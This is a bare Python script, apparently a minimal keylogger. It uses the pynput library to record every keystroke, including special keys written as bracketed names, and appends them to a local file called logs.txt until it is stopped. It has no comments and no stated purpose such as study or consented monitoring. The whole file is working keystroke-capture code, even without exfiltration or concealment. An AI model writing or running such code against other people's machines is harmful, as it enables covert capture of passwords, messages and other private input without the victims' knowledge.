from pynput.keyboard import Listener

log_file = "logs.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            key_name = str(key).replace("Key.", "")
            f.write(f"[{key_name}]")

with Listener(on_press=on_press) as listener:
    listener.join()
